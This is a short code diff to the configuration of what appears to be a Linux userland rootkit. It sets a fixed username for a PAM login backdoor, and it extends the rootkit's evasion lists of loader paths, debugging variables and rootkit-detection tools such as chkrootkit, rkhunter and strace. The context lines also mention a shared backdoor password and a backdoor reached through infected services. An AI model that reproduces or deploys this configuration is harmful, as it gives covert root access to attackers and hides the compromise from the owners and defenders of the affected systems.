@@ -8,7 +8,7 @@
 BACKDOOR_PASS = None  # password for all doors. set to None = random
 
 USE_PAM_BD = True
-PAM_UNAME  = None  # set to None = random
+PAM_UNAME  = "super"  # set to None = random
 
 # accept() backdoor. allows backdoor access via infected services on the box.
 # must have a dedicated port number for this. dedicated port cannot be used for other stuff.
@@ -154,7 +154,7 @@ validpkgmans = ['apt', 'yum', 'pacman', 'emerge']
 #    c. or just processes whose names match those below.
 scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']
 scary_paths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*',
-               '*/*ld-*.so', '*ld-*.so', '*/ld-*.so.*']
+               '*/*ld-*.so', '*ld-*.so', '*/ld-*.so.*', '/usr/lib64/ld-2.17.so', '/usr/lib/ld-2.17.so']
 scary_procs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide', 'rkhunter',
                'chkproc', 'chkdirs', 'ltrace','strace']
 
